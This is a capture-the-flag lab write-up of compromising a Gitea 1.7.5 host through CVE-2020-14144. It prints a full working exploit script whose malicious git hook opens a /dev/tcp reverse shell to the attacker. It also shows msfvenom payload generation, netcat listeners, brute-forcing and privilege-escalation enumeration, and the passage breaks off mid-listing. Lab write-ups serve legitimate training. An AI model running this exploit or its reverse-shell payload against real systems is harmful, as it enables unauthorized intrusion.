# CTF Writeup: Roguefort

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.130.67
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-28 09:09 EST
Nmap scan report for 192.168.130.67
Host is up (0.027s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE  SERVICE VERSION
21/tcp   open   ftp     ProFTPD 1.3.5b
22/tcp   open   ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:77:6f:b1:ed:65:b5:ad:14:64:40:d2:24:d3:9c:0d (RSA)
|   256 a9:b4:4f:61:2e:2d:9d:4c:48:15:fe:70:8e:fa:af:b3 (ECDSA)
|_  256 92:56:eb:af:c9:34:af:ea:a1:cf:9f:e1:90:dd:2f:61 (ED25519)
53/tcp   closed domain
2222/tcp open   ssh     Dropbear sshd 2016.74 (protocol 2.0)
3000/tcp open   http    Golang net/http server
|_http-title: Gitea: Git with a cup of tea
| fingerprint-strings: 
|   GenericLines, Help: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=0a25b31a99056826; Path=/; HttpOnly
|     Set-Cookie: _csrf=TrTFWseKvIseXMmA3enMRBRGxfM6MTc2NjkzMTAwMTYwMTMyNTg5OA%3D%3D; Path=/; Expires=Mon, 29 Dec 2025 14:10:01 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Sun, 28 Dec 2025 14:10:01 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <script>
|     ('serviceWorker' in navigator) {
|     window.addEventListener('load', function() {
|     navigator.serviceWorker.register('/serviceworker.js').then(function(registration) {
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=10e01274bb7b438e; Path=/; HttpOnly
|     Set-Cookie: _csrf=AtbLK250BohDOv-PJMokag3J8C46MTc2NjkzMTAwMTc0NDU1MTc4OQ%3D%3D; Path=/; Expires=Mon, 29 Dec 2025 14:10:01 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Sun, 28 Dec 2025 14:10:01 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Page Not Found - Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <script>
|     ('serviceWorker' in navigator) {
|     window.addEventListener('load', function() {
|_    navigator.serviceWorker.register('/serviceworker.js').then(function(registration
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.95%I=7%D=12/28%Time=69513A39%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(GetRequest,1000,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:
SF:\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path=/
SF:;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=0a25b31a99056826
SF:;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=TrTFWseKvIseXMmA3enMRB
SF:RGxfM6MTc2NjkzMTAwMTYwMTMyNTg5OA%3D%3D;\x20Path=/;\x20Expires=Mon,\x202
SF:9\x20Dec\x202025\x2014:10:01\x20GMT;\x20HttpOnly\r\nX-Frame-Options:\x2
SF:0SAMEORIGIN\r\nDate:\x20Sun,\x2028\x20Dec\x202025\x2014:10:01\x20GMT\r\
SF:n\r\n<!DOCTYPE\x20html>\n<html>\n<head\x20data-suburl=\"\">\n\t<meta\x2
SF:0charset=\"utf-8\">\n\t<meta\x20name=\"viewport\"\x20content=\"width=de
SF:vice-width,\x20initial-scale=1\">\n\t<meta\x20http-equiv=\"x-ua-compati
SF:ble\"\x20content=\"ie=edge\">\n\t<title>Gitea:\x20Git\x20with\x20a\x20c
SF:up\x20of\x20tea</title>\n\t<link\x20rel=\"manifest\"\x20href=\"/manifes
SF:t\.json\"\x20crossorigin=\"use-credentials\">\n\t\n\t<script>\n\t\tif\x
SF:20\('serviceWorker'\x20in\x20navigator\)\x20{\n\x20\x20\t\t\twindow\.ad
SF:dEventListener\('load',\x20function\(\)\x20{\n\x20\x20\x20\x20\t\t\tnav
SF:igator\.serviceWorker\.register\('/serviceworker\.js'\)\.then\(function
SF:\(registration\)\x20{\n\x20\x20\x20\x20\x20\x20\t\t\t\t\n\x20\x20\x20\x
SF:20\x20\x20\t\t\t")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
SF:r\n400\x20Bad\x20Request")%r(HTTPOptions,1000,"HTTP/1\.0\x20404\x20Not\
SF:x20Found\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:
SF:\x20lang=en-US;\x20Path=/;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_li
SF:ke_gitea=10e01274bb7b438e;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_cs
SF:rf=AtbLK250BohDOv-PJMokag3J8C46MTc2NjkzMTAwMTc0NDU1MTc4OQ%3D%3D;\x20Pat
SF:h=/;\x20Expires=Mon,\x2029\x20Dec\x202025\x2014:10:01\x20GMT;\x20HttpOn
SF:ly\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Sun,\x2028\x20Dec\x202
SF:025\x2014:10:01\x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html>\n<head\x20data
SF:-suburl=\"\">\n\t<meta\x20charset=\"utf-8\">\n\t<meta\x20name=\"viewpor
SF:t\"\x20content=\"width=device-width,\x20initial-scale=1\">\n\t<meta\x20
SF:http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\t<title>Page\x
SF:20Not\x20Found\x20-\x20Gitea:\x20Git\x20with\x20a\x20cup\x20of\x20tea</
SF:title>\n\t<link\x20rel=\"manifest\"\x20href=\"/manifest\.json\"\x20cros
SF:sorigin=\"use-credentials\">\n\t\n\t<script>\n\t\tif\x20\('serviceWorke
SF:r'\x20in\x20navigator\)\x20{\n\x20\x20\t\t\twindow\.addEventListener\('
SF:load',\x20function\(\)\x20{\n\x20\x20\x20\x20\t\t\tnavigator\.serviceWo
SF:rker\.register\('/serviceworker\.js'\)\.then\(function\(registration");
Aggressive OS guesses: Linux 3.10 - 4.11 (96%), Linux 3.13 - 4.4 (96%), Linux 3.2 - 4.14 (94%), Linux 2.6.32 - 3.13 (93%), Linux 3.8 - 3.16 (92%), Linux 3.16 - 4.6 (91%), Linux 3.13 or 4.2 (90%), Linux 4.4 (90%), Linux 2.6.32 - 3.10 (90%), Linux 5.0 - 5.14 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   27.27 ms 192.168.45.1
2   27.29 ms 192.168.45.254
3   27.33 ms 192.168.251.1
4   27.32 ms 192.168.130.67

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 136.45 seconds
```

Tried accessing ftp anonymously, but failed.

Tried bruteforcing ftp credentials, but couldn't retrieve anything.

```
hydra -C /usr/share/wordlists/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.130.67
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-28 09:22:00
[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
[DATA] attacking ftp://192.168.130.67:21/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-28 09:22:02
```

Let's move onto the webpage running on port 3000.

It seems to be running "Gitea" 1.7.5 coded in Go 1.12.1

Let's enumerate endpoints before moving onto exploits.

```
feroxbuster -u http://192.168.130.67:3000
                                                                                                                                              
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.130.67:3000/
 🚩  In-Scope Url          │ 192.168.130.67
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET      267l      685w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        2l        2w       34c http://192.168.130.67:3000/admin => http://192.168.130.67:3000/user/login
200      GET      192l      480w     5555c http://192.168.130.67:3000/vendor/plugins/jquery.areyousure/jquery.are-you-sure.js
200      GET       94l      304w     3466c http://192.168.130.67:3000/api/swagger
200      GET        2l       26w      809c http://192.168.130.67:3000/vendor/plugins/cssrelpreload/loadCSS.min.js
200      GET        1l       86w     1157c http://192.168.130.67:3000/img/gitea-safari.svg
200      GET      156l      258w     9246c http://192.168.130.67:3000/vendor/librejs.html
200      GET        2l       17w      679c http://192.168.130.67:3000/vendor/plugins/cssrelpreload/cssrelpreload.min.js
200      GET        7l      296w     9838c http://192.168.130.67:3000/vendor/plugins/clipboard/clipboard.min.js
200      GET       21l      111w     8603c http://192.168.130.67:3000/img/gitea-sm.png
200      GET       70l       97w     2353c http://192.168.130.67:3000/serviceworker.js
302      GET        2l        2w       37c http://192.168.130.67:3000/explore/ => http://192.168.130.67:3000/explore/repos
200      GET       70l      232w    14724c http://192.168.130.67:3000/img/favicon.png
200      GET       31l       58w      669c http://192.168.130.67:3000/manifest.json
200      GET        1l       10w     7912c http://192.168.130.67:3000/vendor/assets/octicons/octicons.min.css
200      GET        4l       94w    13252c http://192.168.130.67:3000/vendor/plugins/emojify/emojify.min.js
200      GET      320l      788w     9433c http://192.168.130.67:3000/user/sign_up
200      GET      330l      800w     9369c http://192.168.130.67:3000/user/login
200      GET        4l       66w    29063c http://192.168.130.67:3000/vendor/assets/font-awesome/css/font-awesome.min.css
200      GET        6l     1692w    93107c http://192.168.130.67:3000/vendor/plugins/vue/vue.min.js
200      GET        5l     1434w    97163c http://192.168.130.67:3000/vendor/plugins/jquery/jquery.min.js
200      GET     2950l     7112w   102417c http://192.168.130.67:3000/js/index.js
200      GET      320l      827w    10049c http://192.168.130.67:3000/explore/repos
200      GET      164l      888w    81704c http://192.168.130.67:3000/img/gitea-lg.png
200      GET       11l     5420w   274206c http://192.168.130.67:3000/vendor/plugins/semantic/semantic.min.js
200      GET        1l     2666w    75723c http://192.168.130.67:3000/css/index.css
200      GET        5l       10w      160c http://192.168.130.67:3000/debug
200      GET      419l    14198w   621792c http://192.168.130.67:3000/vendor/plugins/semantic/semantic.min.css
200      GET      314l      905w     9919c http://192.168.130.67:3000/
200      GET        5l       10w      160c http://192.168.130.67:3000/debug/
302      GET        2l        2w       34c http://192.168.130.67:3000/issues => http://192.168.130.67:3000/user/login
302      GET        2l        2w       37c http://192.168.130.67:3000/explore => http://192.168.130.67:3000/explore/repos
302      GET        2l        2w       34c http://192.168.130.67:3000/notifications => http://192.168.130.67:3000/user/login
200      GET       11l      114w     8167c http://192.168.130.67:3000/img/404.png
404      GET      214l      619w     6524c http://192.168.130.67:3000/tst
404      GET      214l      619w     6524c http://192.168.130.67:3000/emp
404      GET      214l      619w     6524c http://192.168.130.67:3000/lan
200      GET        1l        4w       26c http://192.168.130.67:3000/healthcheck
404      GET      214l      619w     6524c http://192.168.130.67:3000/def
404      GET      214l      619w     6524c http://192.168.130.67:3000/jar
[######>-------------] - 44s    18494/60055   2m      found:39      errors:0      
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_192_168_130_67_3000_-1766932621.state ...
[######>-------------] - 44s    18506/60055   2m      found:39      errors:0      
[######>-------------] - 44s     9321/30000   212/s   http://192.168.130.67:3000/ 
[######>-------------] - 42s     9105/30000   219/s   http://192.168.130.67:3000/debug/
```

## Vulnerability Assessment

Let's search up for CVE's.

```
searchsploit Gitea 1.7.5                 
------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                              |  Path
------------------------------------------------------------------------------------------------------------ ---------------------------------
Gitea 1.7.5 - Remote Code Execution                                                                         | multiple/webapps/49383.py
------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Created reverse shell payload.

```
msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=192.168.45.221 LPORT=21
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: shell
```

Decided to utilize the following exploit.

```
git clone https://github.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce.git
```

Modified the exploit slightly with DeepSeek.

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Exploit Title: GiTea Authenticated Remote Code Execution using git hooks on versions >= 1.1.0 to <= 1.12.5
# Date: 17 Feb 2020
# Exploit Author: @Podalirius (https://podalirius.net/)
# PoC demonstration article: https://podalirius.net/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution/
# Vendor Homepage: https://gitea.io/
# Software Link: https://dl.gitea.io/
# Version: >= 1.1.0 to <= 1.12.5
# Tested on: Ubuntu 16.04 with GiTea 1.6.1
# CVE : CVE-2020-14144

# File name          : gitea_CVE-2020-14144.py
# Author             : @Podalirius
# Python Version     : 3.*

import argparse
import os
import pexpect
import random
import re
import sys
import time

import requests

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

# Removed deprecated SSL cipher configuration that causes errors in newer urllib3 versions


class GiTea(object):
    def __init__(self, host, verbose=False):
        super(GiTea, self).__init__()
        self.verbose = verbose
        self.host = host
        self.username = None
        self.password = None
        self.uid = None
        self.session = None

    def _get_csrf(self, url):
        pattern = r'name="_csrf" content="([a-zA-Z0-9\-_=]+)"'  # Fixed escape sequences
        csrf = []
        while len(csrf) == 0:
            r = self.session.get(url, verify=False)  # Added verify=False for SSL
            csrf = re.findall(pattern, r.text)
            time.sleep(1)
        csrf = csrf[0]
        return csrf

    def _get_uid(self, url):
        pattern = r'name="_uid" content="([0-9]+)"'
        uid = re.findall(pattern, self.session.get(url, verify=False).text)
        while len(uid) == 0:
            time.sleep(1)
            uid = re.findall(pattern, self.session.get(url, verify=False).text)
        uid = uid[0]
        return int(uid)

    def login(self, username, password):
        if self.verbose:
            print("   [>] login('%s', ...)" % username)
        self.session = requests.Session()
        r = self.session.get('%s/user/login' % self.host, verify=False)
        self.username = username
        self.password = password

        # Logging in
        csrf = self._get_csrf(self.host)
        r = self.session.post(
            '%s/user/login?redirect_to=%%2f%s' % (self.host, self.username),
            data={'_csrf': csrf, 'user_name': username, 'password': password},
            allow_redirects=True,
            verify=False  # Added verify=False for SSL
        )
        if b'Username or password is incorrect.' in r.content:
            return False
        else:
            # Getting User id
            self.uid = self._get_uid(self.host)
            return True

    def repo_create(self, repository_name):
        if self.verbose:
            print("   [>] Creating repository : %s" % repository_name)
        csrf = self._get_csrf(self.host)
        # Create repo
        r = self.session.post(
            '%s/repo/create' % self.host,
            data={
                '_csrf': csrf,
                'uid': self.uid,
                'repo_name': repository_name,
                'description': "Lorem Ipsum",
                'gitignores': '',
                'license': '',
                'readme': 'Default',
                'auto_init': 'off'
            },
            verify=False  # Added verify=False for SSL
        )
        return None

    def repo_delete(self, repository_name):
        if self.verbose:
            print("   [>] Deleting repository : %s" % repository_name)
        csrf = self._get_csrf('%s/%s/%s/settings' % (self.host, self.username, repository_name))
        # Delete repository
        r = self.session.post(
            '%s/%s/%s/settings' % (self.host, self.username, repository_name),
            data={
                '_csrf': csrf,
                'action': "delete",
                'repo_name': repository_name
            },
            verify=False  # Added verify=False for SSL
        )
        return

    def repo_set_githook_pre_receive(self, repository_name, content):
        if self.verbose:
            print("   [>] repo_set_githook_pre_receive('%s')" % repository_name)
        csrf = self._get_csrf('%s/%s/%s/settings/hooks/git/pre-receive' % (self.host, self.username, repository_name))
        # Set pre receive git hook
        r = self.session.post(
            '%s/%s/%s/settings/hooks/git/pre-receive' % (self.host, self.username, repository_name),
            data={
                '_csrf': csrf,
                'content': content
            },
            verify=False  # Added verify=False for SSL
        )
        return

    def repo_set_githook_update(self, repository_name, content):
        if self.verbose == True:
            print("   [>] repo_set_githook_update('%s')" % repository_name)
        csrf = self._get_csrf('%s/%s/%s/settings/hooks/git/update' % (self.host, self.username, repository_name))
        # Set update git hook
        r = self.session.post(
            '%s/%s/%s/settings/hooks/git/update' % (self.host, self.username, repository_name),
            data={
                '_csrf': csrf,
                'content': content
            },
            verify=False  # Added verify=False for SSL
        )
        return

    def repo_set_githook_post_receive(self, repository_name, content):
        if self.verbose:
            print("   [>] repo_set_githook_post_receive('%s')" % repository_name)
        csrf = self._get_csrf('%s/%s/%s/settings/hooks/git/post-receive' % (self.host, self.username, repository_name))
        # Set post receive git hook
        r = self.session.post(
            '%s/%s/%s/settings/hooks/git/post-receive' % (self.host, self.username, repository_name),
            data={
                '_csrf': csrf,
                'content': content
            },
            verify=False  # Added verify=False for SSL
        )
        return

    def logout(self):
        if self.verbose:
            print("   [>] logout()")
        # Logging out
        r = self.session.get('%s/user/logout' % self.host, verify=False)
        return None


def trigger_exploit(host, username, password, repository_name, verbose=False):
    # Create a temporary directory
    tmpdir = os.popen('mktemp -d').read().strip()
    os.chdir(tmpdir)
    # We create some files in the repository
    os.system('touch README.md')
    rndstring = ''.join([hex(random.randint(0, 15))[2:] for k in range(32)])
    os.system('echo "%s" >> README.md' % rndstring)
    os.system('git init')
    os.system('git add README.md')
    os.system('git commit -m "Initial commit"')
    # Connect to remote source repository
    os.system('git remote add origin %s/%s/%s.git' % (host, username, repository_name))
    # Push the files (it will trigger post-receive git hook)
    conn = pexpect.spawn("/bin/bash -c 'cd %s && git push -u origin master'" % tmpdir)
    conn.expect("Username for .*: ")
    conn.sendline(username)
    conn.expect("Password for .*: ")
    conn.sendline(password)
    conn.expect("Total.*")
    print(conn.before.decode('utf-8').strip())
    return None


def parseArgs():
    parser = argparse.ArgumentParser(description='CVE-2020-14144 - GiTea authenticated Remote Code Execution using git hooks.')
    parser.add_argument("-v", "--verbose", required=False, default=False, action='store_true', help='Increase verbosity.')
    parser.add_argument("-t", "--target", required=True, type=str, help='Target host (http://..., https://... or domain name)')
    parser.add_argument("-u", "--username", required=True, type=str, default=None, help='GiTea username')
    parser.add_argument("-p", "--password", required=True, type=str, default=None, help='GiTea password')
    parser.add_argument("-I", "--rev-ip", required=False, type=str, default=None, help='Reverse shell listener IP')
    parser.add_argument("-P", "--rev-port", required=False, type=int, default=None, help='Reverse shell listener port')
    parser.add_argument("-f", "--payload-file", required=False, default=None, help='Path to shell script payload to use.')
    return parser.parse_args()


def header():
    print("""    _____ _ _______
   / ____(_)__   __|             CVE-2020-14144
  | |  __ _   | | ___  __ _
  | | |_ | |  | |/ _ \/ _` |     Authenticated Remote Code Execution
  | |__| | |  | |  __/ (_| |
   \_____|_|  |_|\___|\__,_|     GiTea versions >= 1.1.0 to <= 1.12.5
     """)


if __name__ == '__main__':
    header()
    args = parseArgs()

    if (args.rev_ip is not None or args.rev_port is not None) and args.payload_file is not None:
        print('[!] Either (-I REV_IP and -P REV_PORT) or (-f PAYLOAD_FILE) options are needed, not both')
        sys.exit(-1)
    
    if args.rev_ip is not None and args.rev_port is None:
        print('[!] When using -I REV_IP, you must also specify -P REV_PORT')
        sys.exit(-1)
    
    if args.rev_port is not None and args.rev_ip is None:
        print('[!] When using -P REV_PORT, you must also specify -I REV_IP')
        sys.exit(-1)

    # Read specific payload file
    if args.payload_file is not None:
        try:
            f = open(args.payload_file, 'r')
            hook_payload = ''.join(f.readlines())
            f.close()
        except Exception as e:
            print('[!] Error reading payload file: %s' % str(e))
            sys.exit(-1)
    elif args.rev_ip is not None and args.rev_port is not None:
        hook_payload = """#!/bin/bash\nbash -i >& /dev/tcp/%s/%d 0>&1 &\n""" % (args.rev_ip, args.rev_port)
    else:
        print('[!] You must specify either (-I REV_IP and -P REV_PORT) or (-f PAYLOAD_FILE)')
        sys.exit(-1)

    if args.target.startswith('http://') or args.target.startswith('https://'):
        pass
    else:
        args.target = 'http://' + args.target  # Changed default to http

    print('[+] Starting exploit ...')
    g = GiTea(args.target, verbose=args.verbose)
    if g.login(args.username, args.password):
        reponame = 'vuln'
        g.repo_delete(reponame)
        g.repo_create(reponame)
        g.repo_set_githook_post_receive(reponame, hook_payload)
        g.logout()
        trigger_exploit(g.host, g.username, g.password, reponame, verbose=args.verbose)
        g.repo_delete(reponame)
    else:
        print('\x1b[1;91m[!]\x1b[0m Could not login with these credentials.')
    print('[+] Exploit completed !')
```

Started up my listener on port 22.

```
rlwrap nc -lvnp 22
```

Ran the exploit.

```
python3 CVE-2020-14144-GiTea-git-hooks-rce.py -t 192.168.130.67:3000 -u saitama -p password -I 192.168.45.221 -P 22
/home/saitama/Desktop/Exploiting/OSCP_Prep/ProvingGrounds/Linux/Roguefort/CVE-2020-14144-GiTea-git-hooks-rce/CVE-2020-14144-GiTea-git-hooks-rce.py:216: SyntaxWarning: invalid escape sequence '\/'
  | | |_ | |  | |/ _ \/ _` |     Authenticated Remote Code Execution
    _____ _ _______
   / ____(_)__   __|             CVE-2020-14144
  | |  __ _   | | ___  __ _
  | | |_ | |  | |/ _ \/ _` |     Authenticated Remote Code Execution
  | |__| | |  | |  __/ (_| |
   \_____|_|  |_|\___|\__,_|     GiTea versions >= 1.1.0 to <= 1.12.5
     
[+] Starting exploit ...

hint: Using 'master' as the name for the initial branch. This default branch name
hint: is subject to change. To configure the initial branch name to use in all
hint: of your new repositories, which will suppress this warning, call:
hint:
hint:   git config --global init.defaultBranch <name>
hint:
hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
hint: 'development'. The just-created branch can be renamed via this command:
hint:
hint:   git branch -m <name>
hint:
hint: Disable this message with "git config set advice.defaultBranchName false"
Initialized empty Git repository in /tmp/tmp.XDZ3ntyxBm/.git/
[master (root-commit) 714383e] Initial commit
 1 file changed, 1 insertion(+)
 create mode 100644 README.md
Enumerating objects: 3, done.
Counting objects: 100% (3/3), done.
Writing objects: 100% (3/3), 249 bytes | 249.00 KiB/s, done.
[+] Exploit completed !
```

Gained RCE as user "chloe".

```
rlwrap nc -lvnp 22  
listening on [any] 22 ...
connect to [192.168.45.221] from (UNKNOWN) [192.168.130.67] 54204
bash: cannot set terminal process group (747): Inappropriate ioctl for device
bash: no job control in this shell
chloe@roquefort:~/gitea-repositories/saitama/vuln.git$
```

Retrieved local.txt in /home/chloe directory.

```
f8686b11685ae0bcfdc01a4ebf2a897f
```

## Privilege Escalation

Performed Shell Hardening

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo ; fg ; reset
stty columns 200 rows 200
export TERM=xterm
```

Displaying the /etc/crontab file.

```
chloe@roquefort:~/gitea-repositories/saitama/vuln.git$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/5 *   * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

Searched up for writable directories. It's interesting because the /usr/local/bin path is also connected to cronjobs and we got write access to it.

```
chloe@roquefort:~/gitea-repositories/saitama/vuln.git$ find / -type d -writable 2>/dev/null
/var/lib/gitea
/var/lib/gitea/log
/var/lib/gitea/log/hooks
/var/lib/gitea/data
/var/lib/gitea/data/indexers
/var/lib/gitea/data/indexers/issues.bleve
/var/lib/gitea/data/lfs
/var/lib/gitea/data/avatars
/var/lib/gitea/data/sessions
/var/lib/gitea/data/sessions/e
/var/lib/gitea/data/sessions/e/e
/var/lib/gitea/data/sessions/e/3
/var/lib/gitea/data/sessions/e/9
/var/lib/gitea/data/sessions/e/a
/var/lib/gitea/data/sessions/e/5
/var/lib/gitea/data/sessions/e/4
/var/lib/gitea/data/sessions/e/c
/var/lib/gitea/data/sessions/e/f
/var/lib/gitea/data/sessions/e/0
/var/lib/gitea/data/sessions/e/d
/var/lib/gitea/data/sessions/e/7
/var/lib/gitea/data/sessions/e/8
/var/lib/gitea/data/sessions/e/b
/var/lib/gitea/data/sessions/e/1
/var/lib/gitea/data/sessions/e/2
/var/lib/gitea/data/sessions/e/6
/var/lib/gitea/data/sessions/3
/var/lib/gitea/data/sessions/3/e
/var/lib/gitea/data/sessions/3/3
/var/lib/gitea/data/sessions/3/9
/var/lib/gitea/data/sessions/3/a
/var/lib/gitea/data/sessions/3/5
/var/lib/gitea/data/sessions/3/4
/var/lib/gitea/data/sessions/3/c
/var/lib/gitea/data/sessions/3/f
/var/lib/gitea/data/sessions/3/0
/var/lib/gitea/data/sessions/3/d
/var/lib/gitea/data/sessions/3/7
/var/lib/gitea/data/sessions/3/8
/var/lib/gitea/data/sessions/3/b
/var/lib/gitea/data/sessions/3/1
/var/lib/gitea/data/sessions/3/2
/var/lib/gitea/data/sessions/3/6
/var/lib/gitea/data/sessions/9
/var/lib/gitea/data/sessions/9/e
/var/lib/gitea/data/sessions/9/3
/var/lib/gitea/data/sessions/9/9
/var/lib/gitea/data/sessions/9/a
/var/lib/gitea/data/sessions/9/5
/var/lib/gitea/data/sessions/9/4
/var/lib/gitea/data/sessions/9/c
/var/lib/gitea/data/sessions/9/f
/var/lib/gitea/data/sessions/9/0
/var/lib/gitea/data/sessions/9/d
/var/lib/gitea/data/sessions/9/7
/var/lib/gitea/data/sessions/9/8
/var/lib/gitea/data/sessions/9/b
/var/lib/gitea/data/sessions/9/1
/var/lib/gitea/data/sessions/9/2
/var/lib/gitea/data/sessions/9/6
/var/lib/gitea/data/sessions/a
/var/lib/gitea/data/sessions/a/e
/var/lib/gitea/data/sessions/a/3
/var/lib/gitea/data/sessions/a/9
/var/lib/gitea/data/sessions/a/a
/var/lib/gitea/data/sessions/a/5
/var/lib/gitea/data/sessions/a/4
/var/lib/gitea/data/sessions/a/c
/var/lib/gitea/data/sessions/a/f
/var/lib/gitea/data/sessions/a/0
/var/lib/gitea/data/sessions/a/d
/var/lib/gitea/data/sessions/a/7
/var/lib/gitea/data/sessions/a/8
/var/lib/gitea/data/sessions/a/b
/var/lib/gitea/data/sessions/a/1
/var/lib/gitea/data/sessions/a/2
/var/lib/gitea/data/sessions/a/6
/var/lib/gitea/data/sessions/5
/var/lib/gitea/data/sessions/5/e
/var/lib/gitea/data/sessions/5/3
/var/lib/gitea/data/sessions/5/9
/var/lib/gitea/data/sessions/5/a
/var/lib/gitea/data/sessions/5/5
/var/lib/gitea/data/sessions/5/4
/var/lib/gitea/data/sessions/5/c
/var/lib/gitea/data/sessions/5/f
/var/lib/gitea/data/sessions/5/0
/var/lib/gitea/data/sessions/5/d
/var/lib/gitea/data/sessions/5/7
/var/lib/gitea/data/sessions/5/8
/var/lib/gitea/data/sessions/5/b
/var/lib/gitea/data/sessions/5/1
/var/lib/gitea/data/sessions/5/2
/var/lib/gitea/data/sessions/5/6
/var/lib/gitea/data/sessions/4
/var/lib/gitea/data/sessions/4/e
/var/lib/gitea/data/sessions/4/3
/var/lib/gitea/data/sessions/4/9
/var/lib/gitea/data/sessions/4/a
/var/lib/gitea/data/sessions/4/5
/var/lib/gitea/data/sessions/4/4
/var/lib/gitea/data/sessions/4/c
/var/lib/gitea/data/sessions/4/f
/var/lib/gitea/data/sessions/4/0
/var/lib/gitea/data/sessions/4/d
/var/lib/gitea/data/sessions/4/7
/var/lib/gitea/data/sessions/4/8
/var/lib/gitea/data/sessions/4/b
/var/lib/gitea/data/sessions/4/1
/var/lib/gitea/data/sessions/4/2
